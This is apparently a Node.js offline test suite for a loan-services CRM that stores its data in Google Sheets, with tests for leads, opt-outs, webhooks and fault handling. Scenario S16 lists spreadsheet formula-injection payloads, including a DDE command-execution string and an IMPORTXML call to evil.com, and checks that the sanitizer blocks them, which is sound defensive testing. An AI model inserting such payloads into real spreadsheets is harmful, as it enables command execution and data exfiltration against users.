/**
 * TASK 5H.4 — GOOGLE SHEETS CRM ARCHITECTURE OFFLINE TEST SUITE (20 SCENARIOS)
 *
 * Business: AVANI LOAN SERVICES — ChatMitra + AVANI AI CRM
 * Execution Mode: 100% Offline (MOCK_IN_MEMORY store, zero network calls, zero MongoDB)
 * Loads actual production TypeScript modules via in-memory typescript.transpileModule + @/ alias resolver.
 */

const { describe, it, beforeEach } = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const Module = require('node:module');
const path = require('node:path');
const ts = require('typescript');

const ROOT_DIR = path.resolve(__dirname, '..');
const SRC_DIR = path.join(ROOT_DIR, 'src');

// ============================================================================
// 1. IN-MEMORY TYPESCRIPT TRANSPILATION & @/ PATH ALIAS HOOK
// ============================================================================
const origResolveFilename = Module._resolveFilename;
Module._resolveFilename = function (request, parent, isMain, options) {
  if (request.startsWith('@/')) {
    const rel = request.slice(2);
    const candidateBase = path.join(SRC_DIR, rel);
    const candidates = [
      candidateBase,
      `${candidateBase}.ts`,
      `${candidateBase}.tsx`,
      path.join(candidateBase, 'index.ts'),
      path.join(candidateBase, 'index.tsx')
    ];
    for (const c of candidates) {
      if (fs.existsSync(c) && fs.statSync(c).isFile()) {
        return c;
      }
    }
  }
  return origResolveFilename.call(this, request, parent, isMain, options);
};

require.extensions['.ts'] = function (mod, filename) {
  const source = fs.readFileSync(filename, 'utf8');
  const compiled = ts.transpileModule(source, {
    compilerOptions: {
      module: ts.ModuleKind.CommonJS,
      target: ts.ScriptTarget.ES2022,
      esModuleInterop: true,
      allowJs: true
    },
    fileName: filename
  });
  mod._compile(compiled.outputText, filename);
};

// Mock next/server for NextResponse.json in pure Node.js
const nextServerMock = {
  NextResponse: class MockNextResponse {
    constructor(body, init = {}) {
      this._body = body;
      this.status = init.status || 200;
      this.headers = new Map(Object.entries(init.headers || {}));
    }
    async json() {
      return typeof this._body === 'string' ? JSON.parse(this._body) : this._body;
    }
    async text() {
      return typeof this._body === 'string' ? this._body : JSON.stringify(this._body);
    }
    static json(data, init = {}) {
      return new MockNextResponse(data, init);
    }
  }
};

// Inject NextResponse and @vercel/functions mocks into require cache before loading routes
const nextServerId = require.resolve('next/server');
require.cache[nextServerId] = { id: nextServerId, filename: nextServerId, loaded: true, exports: nextServerMock };

const originalLoad = Module._load;
Module._load = function (request, parent, isMain) {
  if (request === 'next/server') return nextServerMock;
  if (request === '@vercel/functions') {
    return { waitUntil: (promise) => Promise.resolve(promise).catch(() => {}) };
  }
  return originalLoad.call(this, request, parent, isMain);
};

// Set safe offline test environment variables
process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'MOCK_IN_MEMORY';
process.env.GOOGLE_SHEETS_ENABLE_MOCK = 'true';
process.env.SESSION_SECRET = 'test_5h4_session_secret_0123456789abcdef';
process.env.CHATMITRA_WEBHOOK_SECRET = 'test_5h4_chatmitra_secret_0123456789';
process.env.INTERNAL_WORKER_SECRET = 'test_5h4_worker_secret_0123456789';
process.env.SAFE_MODE_FORCE_SUPPRESS = 'true';

// Load production modules
const sheets = require('../src/lib/google-sheets/index.ts');
const auth = require('../src/lib/auth.ts');
const { OptOutEngine } = require('../src/lib/optout-engine.ts');
const consentPrivacy = require('../src/lib/consent-privacy.ts');

const healthRoute = require('../src/app/api/health/route.ts');
const advisorsRoute = require('../src/app/api/advisors/route.ts');
const contactsRoute = require('../src/app/api/contacts/route.ts');
const leadsRoute = require('../src/app/api/leads/route.ts');
const leadApplicationRoute = require('../src/app/api/leads/[id]/application/route.ts');
const scheduleRoute = require('../src/app/api/schedule/route.ts');
const metricsRoute = require('../src/app/api/dashboard/metrics/route.ts');
const secureUploadRoute = require('../src/app/api/documents/secure-upload/route.ts');
const chatmitraWebhookRoute = require('../src/app/api/chatmitra-webhook/route.ts');
const workerRoute = require('../src/app/api/whatsapp-webhook-worker/route.ts');

async function createAdminRequest(url, method = 'GET', body = null) {
  const token = await auth.signSessionToken({
    sub: 'ADV-SACHIN-01',
    name: 'Sachin Shinde',
    email: 'sachin@avaniloan.in',
    role: 'ADMIN'
  });
  return new Request(url, {
    method,
    headers: {
      'Content-Type': 'application/json',
      Cookie: `${auth.SESSION_COOKIE_NAME}=${token}`
    },
    ...(body !== null ? { body: JSON.stringify(body) } : {})
  });
}

function signChatMitraBody(rawBody) {
  return crypto
    .createHmac('sha256', process.env.CHATMITRA_WEBHOOK_SECRET)
    .update(rawBody)
    .digest('hex');
}

describe('Task 5H.4 — Google Sheets CRM Architecture (20 Offline Scenarios)', () => {
  beforeEach(() => {
    sheets.resetMockSheetsStore();
    sheets.configureMockSheetsFaults({ forceUnavailable: false, forceQuotaExceeded: false, corruptHeaderOnTab: null });
  });

  // Scenario 1
  it('S01: Customer creation in CUSTOMERS tab with E.164 normalization', async () => {
    const res = await sheets.customerRepository.upsertCustomer({
      customer_name: 'Ramesh Kulkarni',
      mobile_number: '9876543210',
      city: 'Pune',
      enquiry_source: 'WEBSITE'
    });
    assert.equal(res.created, true);
    assert.equal(res.record.mobile_number, '+919876543210');
    assert.equal(res.record.record_status, 'ACTIVE');
    const stored = await sheets.customerRepository.findAll();
    assert.equal(stored.length, 1);
  });

  // Scenario 2
  it('S02: Customer lookup by mobile across formats (+91, 91, 10-digit)', async () => {
    await sheets.customerRepository.upsertCustomer({
      customer_name: 'Suresh Patil',
      mobile_number: '+919822001122',
      city: 'Latur'
    });
    const by10 = await sheets.customerRepository.findByMobile('9822001122');
    const by91 = await sheets.customerRepository.findByMobile('919822001122');
    const byE164 = await sheets.customerRepository.findByMobile('+919822001122');
    assert.ok(by10 && by91 && byE164);
    assert.equal(by10.customer_id, byE164.customer_id);
    assert.equal(by91.customer_name, 'Suresh Patil');
  });

  // Scenario 3
  it('S03: Lead creation in LEADS tab via POST /api/leads', async () => {
    const req = await createAdminRequest('http://localhost/api/leads', 'POST', {
      name: 'Anita Deshmukh',
      phone: '9811223344',
      city: 'Solapur',
      loanType: 'Home Loan',
      requestedAmount: '2500000'
    });
    const res = await leadsRoute.POST(req);
    assert.equal(res.status, 200);
    const data = await res.json();
    assert.equal(data.success, true);
    assert.equal(data.lead.loanType, 'Home Loan');
    assert.equal(data.lead.phone, '+919811223344');
    const allLeads = await sheets.leadRepository.findAll();
    assert.equal(allLeads.length, 1);
  });

  // Scenario 4
  it('S04: Lead update and stage transition in LEADS tab', async () => {
    const { lead } = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Mahesh Joshi',
      phone: '9765432109',
      loanCategory: 'Business Loan',
      requestedAmount: '1500000'
    });
    const { record: updated } = await sheets.leadRepository.upsertLead({
      lead_id: lead.lead_id,
      customer_id: lead.customer_id,
      loan_category: lead.loan_category,
      lead_status: 'QUALIFIED',
      priority: 'HIGH'
    });
    assert.ok(updated);
    assert.equal(updated.lead_status, 'QUALIFIED');
    assert.equal(updated.priority, 'HIGH');
  });

  // Scenario 5
  it('S05: Application status update in APPLICATIONS tab (Submit + Sanction)', async () => {
    const { lead } = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Priya Nair',
      phone: '9890112233',
      loanCategory: 'Mortgage Loan',
      requestedAmount: '3000000'
    });

    const submitReq = await createAdminRequest(`http://localhost/api/leads/${lead.lead_id}/application`, 'POST', {
      action: 'SUBMIT_APPLICATION',
      lenderName: 'HDFC Bank',
      appliedAmount: 3000000
    });
    const submitRes = await leadApplicationRoute.POST(submitReq, {
      params: Promise.resolve({ id: lead.lead_id })
    });
    assert.equal(submitRes.status, 200);

    const sanctionReq = await createAdminRequest(`http://localhost/api/leads/${lead.lead_id}/application`, 'POST', {
      action: 'RECORD_SANCTION',
      sanctionedAmount: 2850000,
      interestRate: 9.15
    });
    const sanctionRes = await leadApplicationRoute.POST(sanctionReq, {
      params: Promise.resolve({ id: lead.lead_id })
    });
    assert.equal(sanctionRes.status, 200);
    const sanctionData = await sanctionRes.json();
    assert.equal(sanctionData.stage, 'SANCTIONED');
    assert.equal(sanctionData.application.application_status, 'SANCTIONED');
    assert.equal(sanctionData.application.requested_amount, '2850000');
  });

  // Scenario 6
  it('S06: Follow-up creation & completion in FOLLOWUPS tab via /api/schedule', async () => {
    const { lead, customer } = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Kiran Pawar',
      phone: '9823456789',
      loanCategory: 'Personal Loan'
    });
    const postReq = await createAdminRequest('http://localhost/api/schedule', 'POST', {
      leadId: lead.lead_id,
      customerId: customer.customer_id,
      type: 'ELIGIBILITY_CALL',
      shortNotes: 'Call at 4 PM'
    });
    const postRes = await scheduleRoute.POST(postReq);
    assert.equal(postRes.status, 200);
    const postData = await postRes.json();
    assert.equal(postData.schedule.status, 'PENDING');

    const patchReq = await createAdminRequest('http://localhost/api/schedule', 'PATCH', {
      followupId: postData.schedule.followupId,
      status: 'COMPLETED',
      notes: 'Customer confirmed income'
    });
    const patchRes = await scheduleRoute.PATCH(patchReq);
    assert.equal(patchRes.status, 200);
    const patchData = await patchRes.json();
    assert.equal(patchData.schedule.followup_status, 'COMPLETED');
  });

  // Scenario 7
  it('S07: Advisor creation & assignment in ADVISORS and LEADS tabs', async () => {
    const postReq = await createAdminRequest('http://localhost/api/advisors', 'POST', {
      advisor_id: 'ADV-NEHA-02',
      advisor_name: 'Neha Sharma',
      role: 'LOAN_ADVISOR'
    });
    const postRes = await advisorsRoute.POST(postReq);
    assert.equal(postRes.status, 200);

    const { lead } = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Vikram Kale',
      phone: '9850123456',
      loanCategory: 'Car Loan',
      assignedAdvisorId: 'ADV-NEHA-02'
    });
    assert.equal(lead.assigned_advisor_id, 'ADV-NEHA-02');
    const hydrated = await sheets.CrmSheetsService.findHydratedLeadByIdOrPhone(lead.lead_id);
    assert.equal(hydrated.assignedAdvisor.name, 'Neha Sharma');
  });

  // Scenario 8
  it('S08: Consent creation & verification in CONSENTS tab', async () => {
    const { consent, customer } = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Deepak Mane',
      phone: '9922334455',
      loanCategory: 'Education Loan',
      consentStatus: 'GRANTED',
      consentSource: 'WEBSITE_FORM'
    });
    assert.equal(consent.customer_id, customer.customer_id);
    assert.equal(consent.consent_status, 'GRANTED');
    assert.equal(consent.optout_status, 'OPTED_IN');
  });

  // Scenario 9
  it('S09: STOP English opt-out suppression across CUSTOMERS, LEADS, CONSENTS, FOLLOWUPS', async () => {
    const { customer, lead } = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Rahul Shinde',
      phone: '9860111222',
      loanCategory: 'Personal Loan'
    });
    assert.equal(OptOutEngine.isOptOutMessage('STOP'), true);

    const result = await OptOutEngine.processOptOut({
      leadId: lead.lead_id,
      phone: '+919860111222',
      messageText: 'STOP',
      suppressAcknowledgement: true
    });
    assert.equal(result.success, true);

    const updatedCustomer = await sheets.customerRepository.findById(customer.customer_id);
    const updatedLead = await sheets.leadRepository.findById(lead.lead_id);
    const updatedConsent = await sheets.consentRepository.findByCustomerId(customer.customer_id);
    const followups = await sheets.followupRepository.findByLeadId(lead.lead_id);

    assert.equal(updatedCustomer.record_status, 'OPTED_OUT');
    assert.equal(updatedLead.lead_status, 'OPTED_OUT');
    assert.equal(updatedConsent.optout_status, 'OPTED_OUT');
    assert.equal(updatedConsent.consent_status, 'WITHDRAWN');
    assert.ok(followups.every((f) => f.followup_status === 'CANCELLED'));
  });

  // Scenario 10
  it('S10: Hindi opt-out ("रोकें") detection and suppression', async () => {
    assert.equal(OptOutEngine.isOptOutMessage('रोकें'), true);
    assert.equal(OptOutEngine.isOptOutMessage('Mujhe personal loan chahiye'), false);

    const { lead } = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Sunita Verma',
      phone: '9730555666',
      loanCategory: 'Gold Loan'
    });
    const res = await OptOutEngine.processOptOut({
      leadId: lead.lead_id,
      phone: '9730555666',
      messageText: 'रोकें',
      suppressAcknowledgement: true
    });
    assert.equal(res.success, true);
    const updatedLead = await sheets.leadRepository.findById(lead.lead_id);
    assert.equal(updatedLead.lead_status, 'OPTED_OUT');
  });

  // Scenario 11
  it('S11: Duplicate webhook event idempotency (WEBHOOK_EVENTS stores hash only)', async () => {
    const payload = {
      event: 'message.received',
      id: 'wamid.dup_test_001',
      from: '919811009988',
      text: 'I need a Home Loan'
    };
    const rawBody = JSON.stringify(payload);
    const sig = signChatMitraBody(rawBody);

    const req1 = new Request('http://localhost/api/chatmitra-webhook', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-webhook-signature': sig },
      body: rawBody
    });
    const res1 = await chatmitraWebhookRoute.POST(req1);
    assert.equal(res1.status, 200);
    const d1 = await res1.json();
    assert.equal(d1.duplicate, undefined);

    const req2 = new Request('http://localhost/api/chatmitra-webhook', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-webhook-signature': sig },
      body: rawBody
    });
    const res2 = await chatmitraWebhookRoute.POST(req2);
    assert.equal(res2.status, 200);
    const d2 = await res2.json();
    assert.equal(d2.duplicate, true);

    const events = await sheets.webhookEventRepository.findAll();
    assert.equal(events.length, 1);
    assert.equal(events[0].payload_hash.length, 64);
    assert.equal('payload' in events[0], false);
  });

  // Scenario 12
  it('S12: Concurrent synthetic webhook requests serialized cleanly with zero duplicates', async () => {
    const payload = {
      event: 'message.received',
      id: 'wamid.concurrent_002',
      from: '919822110022',
      text: 'Business loan enquiry'
    };
    const rawBody = JSON.stringify(payload);
    const sig = signChatMitraBody(rawBody);

    const responses = await Promise.all(
      Array.from({ length: 5 }, () =>
        chatmitraWebhookRoute.POST(
          new Request('http://localhost/api/chatmitra-webhook', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'x-webhook-signature': sig },
            body: rawBody
          })
        )
      )
    );
    const bodies = await Promise.all(responses.map((r) => r.json()));
    const nonDuplicates = bodies.filter((b) => !b.duplicate);
    const duplicates = bodies.filter((b) => b.duplicate === true);
    assert.equal(nonDuplicates.length, 1);
    assert.equal(duplicates.length, 4);
    const events = await sheets.webhookEventRepository.findAll();
    assert.equal(events.length, 1);
  });

  // Scenario 13
  it('S13: Google Sheets unavailable returns HTTP 503 with zero MongoDB fallback', async () => {
    sheets.configureMockSheetsFaults({ forceUnavailable: true });

    const healthRes = await healthRoute.GET(new Request('http://localhost/api/health'));
    assert.equal(healthRes.status, 503);
    const healthData = await healthRes.json();
    assert.equal(healthData.status, 'DEGRADED');
    assert.equal(healthData.available, false);

    const leadsRes = await leadsRoute.GET(await createAdminRequest('http://localhost/api/leads'));
    assert.equal(leadsRes.status, 503);
    const leadsData = await leadsRes.json();
    assert.equal(leadsData.error, 'GOOGLE_SHEETS_UNAVAILABLE');
  });

  // Scenario 14
  it('S14: Google Sheets API quota exceeded returns HTTP 429', async () => {
    sheets.configureMockSheetsFaults({ forceQuotaExceeded: true });
    const leadsRes = await leadsRoute.GET(await createAdminRequest('http://localhost/api/leads'));
    assert.equal(leadsRes.status, 429);
    const data = await leadsRes.json();
    assert.equal(data.error, 'GOOGLE_SHEETS_QUOTA_EXCEEDED');
  });

  // Scenario 15
  it('S15: Invalid spreadsheet schema detection returns HTTP 500 GOOGLE_SHEETS_SCHEMA_INVALID', async () => {
    const headerCheck = sheets.validateSheetHeaderRow('CUSTOMERS', ['wrong_col_1', 'wrong_col_2']);
    assert.equal(headerCheck.valid, false);
    assert.ok(headerCheck.error && headerCheck.error.includes('Invalid schema on tab CUSTOMERS'));

    sheets.configureMockSheetsFaults({ corruptHeaderOnTab: 'LEADS' });
    const leadsRes = await leadsRoute.GET(await createAdminRequest('http://localhost/api/leads'));
    assert.equal(leadsRes.status, 500);
    const data = await leadsRes.json();
    assert.equal(data.error, 'GOOGLE_SHEETS_SCHEMA_INVALID');
  });

  // Scenario 16
  it('S16: Formula injection protection blocks dangerous spreadsheet prefixes + redacts Aadhaar/PAN', async () => {
    const payloads = ['=cmd|\'/C calc\'!A0', '+SUM(A1:A2)', '-2+3', '@IMPORTXML("http://evil.com","//a")'];
    for (const bad of payloads) {
      assert.throws(
        () => sheets.sanitizeCellForSheets('customer_name', bad),
        (err) => err.code === 'GOOGLE_SHEETS_FORMULA_INJECTION_BLOCKED' && err.httpStatus === 400
      );
    }

    const sanitizedNote = sheets.sanitizeCellForSheets(
      'short_notes',
      'Customer Aadhaar 2345 6789 0123 and PAN ABCDE1234F noted'
    );
    assert.equal(sanitizedNote.includes('2345 6789 0123'), false);
    assert.equal(sanitizedNote.includes('ABCDE1234F'), false);
    assert.ok(sanitizedNote.includes('[REDACTED_AADHAAR]'));
    assert.ok(sanitizedNote.includes('[REDACTED_PAN]'));
  });

  // Scenario 17
  it('S17: Document upload endpoint & token utilities return HTTP 410 DOCUMENT_UPLOAD_DISABLED', async () => {
    const getRes = await secureUploadRoute.GET();
    assert.equal(getRes.status, 410);
    const getData = await getRes.json();
    assert.equal(getData.error, 'DOCUMENT_UPLOAD_DISABLED');

    const postRes = await secureUploadRoute.POST();
    assert.equal(postRes.status, 410);
    const postData = await postRes.json();
    assert.equal(postData.error, 'DOCUMENT_UPLOAD_DISABLED');

    const linkRes = consentPrivacy.generateSecureDocumentUploadLink('LEAD-1');
    assert.equal(linkRes.uploadDisabled, true);
    const verifyRes = consentPrivacy.verifySecureDocumentUploadToken('fake.token');
    assert.equal(verifyRes.valid, false);
    assert.equal(verifyRes.error, 'DOCUMENT_UPLOAD_DISABLED');
  });

  // Scenario 18
  it('S18: Inbound WhatsApp media attachment is rejected without storing media IDs or creating Document records', async () => {
    const workerReq = new Request('http://localhost/api/whatsapp-webhook-worker', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-worker-auth': process.env.INTERNAL_WORKER_SECRET
      },
      body: JSON.stringify({
        eventId: 'CM_INBOUND_media_001',
        eventType: 'INBOUND_MESSAGE',
        provider: 'ChatMitra',
        data: {
          fromPhone: '+919811998877',
          msgId: 'media_001',
          profileName: 'Media Sender',
          message: {
            type: 'document',
            id: 'media_001',
            document: { id: 'secret_media_id_999', filename: 'aadhaar.pdf' }
          }
        }
      })
    });
    const res = await workerRoute.POST(workerReq);
    assert.equal(res.status, 200);
    const data = await res.json();
    assert.equal(data.mediaRejected, true);
    assert.equal(data.documentCreated, false);

    const msgEvents = await sheets.messageEventRepository.findAll();
    assert.equal(msgEvents.length, 1);
    assert.equal(msgEvents[0].message_type, 'MEDIA_IGNORED');
    assert.equal(msgEvents[0].delivery_status, 'MEDIA_ATTACHMENT_IGNORED');
    assert.equal(JSON.stringify(msgEvents).includes('secret_media_id_999'), false);
  });

  // Scenario 19
  it('S19: CRM Inbox / Contacts retrieval via GET /api/contacts', async () => {
    const { customer } = await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Pooja Kulkarni',
      phone: '9822778899',
      loanCategory: 'Personal Loan'
    });
    await sheets.messageEventRepository.recordMessageEvent({
      customer_id: customer.customer_id,
      provider: 'ChatMitra',
      message_type: 'TEXT',
      direction: 'inbound',
      delivery_status: 'RECEIVED',
      provider_message_id: 'wamid.inbox_test_1'
    });

    const res = await contactsRoute.GET(await createAdminRequest('http://localhost/api/contacts'));
    assert.equal(res.status, 200);
    const data = await res.json();
    assert.equal(data.success, true);
    assert.equal(data.contacts.length, 1);
    assert.equal(data.contacts[0].name, 'Pooja Kulkarni');
    assert.equal(data.contacts[0].messages.length, 1);
  });

  // Scenario 20
  it('S20: Dashboard metrics retrieval via GET /api/dashboard/metrics', async () => {
    await sheets.CrmSheetsService.registerOrUpdateCustomerLead({
      name: 'Amitabh Rao',
      phone: '9811445566',
      loanCategory: 'Home Loan',
      requestedAmount: '4500000'
    });
    const res = await metricsRoute.GET(await createAdminRequest('http://localhost/api/dashboard/metrics'));
    assert.equal(res.status, 200);
    const data = await res.json();
    assert.equal(data.success, true);
    assert.equal(data.kpis.totalLeads, 1);
    assert.equal(data.dataStore, 'GOOGLE_SHEETS');
  });
});
